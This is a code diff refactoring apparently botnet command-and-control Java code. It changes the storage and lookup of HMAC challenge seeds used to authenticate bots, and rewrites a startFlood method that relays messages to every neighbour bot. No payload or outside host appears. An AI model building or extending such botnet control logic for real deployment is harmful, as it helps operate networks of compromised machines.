@@ -25,6 +25,7 @@ import org.springframework.stereotype.Service;
 import cs.sii.bot.action.Auth;
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
+import cs.sii.domain.SyncIpList;
 import cs.sii.model.bot.Bot;
 import cs.sii.model.user.User;
 import cs.sii.network.request.BotRequest;
@@ -102,7 +103,8 @@ public class Commando {
 		Pairs<Long, Integer> response;
 		Long keyNumber = new Long(auth.generateNumberText());
 		Integer iterationNumber = new Integer(auth.generateIterationNumber());
-		auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
+		auth.getBotSeed().add(new Pairs<String, Pairs<Long, Integer>>(idBot,new Pairs<Long, Integer>(keyNumber, iterationNumber)));
+//		auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
 		response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
 		return response;
 	}
@@ -115,14 +117,15 @@ public class Commando {
 		String response = "";
 		String idBot = objects.get(0).toString();
 		String hashMac = objects.get(7).toString();
-		HashMap<String, Pairs<Long, Integer>> lista = auth.getBotSeed();
-
+		SyncIpList<String, Pairs<Long, Integer>> lista = auth.getBotSeed();
+	
 		if (lista != null) {
-			Pairs<Long, Integer> coppia = lista.get(idBot);
+			Pairs<String, Pairs<Long, Integer>> elem = lista.getByValue1(idBot);
+			Pairs<Long, Integer> coppia=elem.getValue2();
 			if (coppia != null) {
 				Long keyNumber = coppia.getValue1();
-				Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
-				if (auth.findBotChallengeInfo(idBot)) {
+				Integer iterationNumber = coppia.getValue2();
+				if (lista.indexOfValue1(idBot)>=0) {
 					if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
 						response = "Challenge OK";
 						objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
@@ -245,9 +248,14 @@ public class Commando {
 	 * @param msg
 	 */
 	public void startFlood(String msg) {
-		nServ.getNeighbours().getList().forEach((pairs) -> {
+		for (int i = 0; i < nServ.getNeighbours().getSize(); i++) {
+			Pairs<IP, PublicKey> pairs = nServ.getNeighbours().get(i);
 			ccReq.sendFloodToBot(pairs.getValue1().toString(), msg);
-		});
+		}
+		
+//		nServ.getNeighbours().getList().forEach((pairs) -> {
+//			ccReq.sendFloodToBot(pairs.getValue1().toString(), msg);
+//		});
 	}
 
 	/**
